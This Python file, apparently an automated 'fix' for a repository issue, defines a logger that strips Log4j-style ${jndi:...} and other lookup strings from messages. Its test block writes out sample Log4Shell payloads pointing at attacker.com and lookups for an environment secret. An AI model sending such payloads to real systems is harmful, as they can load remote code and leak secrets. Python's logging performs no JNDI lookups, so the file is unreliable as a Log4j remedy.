# Auto fix for zhangjiayang6835-cyber/ai-research#194
# 1782921258

#!/usr/bin/env python3
"""
Security fix for Log4j JNDI Injection vulnerability in custom logging framework.
This module provides a safe logging implementation that prevents JNDI injection attacks.
"""

import re
import logging
from typing import Optional


class SafeLogger:
    """
    A safe logging class that prevents JNDI injection attacks by sanitizing
    log messages and disabling JNDI lookup features.
    """
    
    # Pattern to detect JNDI lookup strings like ${jndi:ldap://...}, ${jndi:dns://...}, etc.
    JNDI_PATTERN = re.compile(r'\$\{jndi:([^}]+)\}', re.IGNORECASE)
    # Pattern to detect other dangerous lookup patterns
    LOOKUP_PATTERN = re.compile(r'\$\{([^}]+)\}', re.IGNORECASE)
    
    def __init__(self, name: str = "safe_logger"):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def _sanitize(self, message: str) -> str:
        """Sanitize log message to prevent JNDI injection."""
        if not isinstance(message, str):
            message = str(message)
        # Remove JNDI lookup patterns
        sanitized = self.JNDI_PATTERN.sub('[JNDI-LOOKUP-BLOCKED]', message)
        # Also block other potentially dangerous lookups
        sanitized = self.LOOKUP_PATTERN.sub('[LOOKUP-BLOCKED]', sanitized)
        return sanitized
    
    def log(self, level: int, message: str) -> None:
        """Safely log a message with JNDI injection protection."""
        safe_message = self._sanitize(message)
        self.logger.log(level, safe_message)
    
    def info(self, message: str) -> None:
        self.log(logging.INFO, message)
    
    def debug(self, message: str) -> None:
        self.log(logging.DEBUG, message)
    
    def warning(self, message: str) -> None:
        self.log(logging.WARNING, message)
    
    def error(self, message: str) -> None:
        self.log(logging.ERROR, message)
    
    def critical(self, message: str) -> None:
        self.log(logging.CRITICAL, message)


def create_safe_logger(name: str = "safe_logger") -> SafeLogger:
    """Factory function to create a safe logger instance."""
    return SafeLogger(name)


# Example usage and test
if __name__ == "__main__":
    logger = create_safe_logger()
    
    # Test normal logging
    logger.info("This is a normal log message")
    
    # Test JNDI injection attempt (should be sanitized)
    logger.info("${jndi:ldap://attacker.com/exploit}")
    logger.info("${jndi:dns://attacker.com/exploit}")
    logger.info("${jndi:rmi://attacker.com/exploit}")
    
    # Test other lookup patterns
    logger.info("${env:SECRET_KEY}")
    logger.info("${sys:user.home}")
    
    print("Safe logger test completed. All JNDI patterns were sanitized.")
print("fix #194")
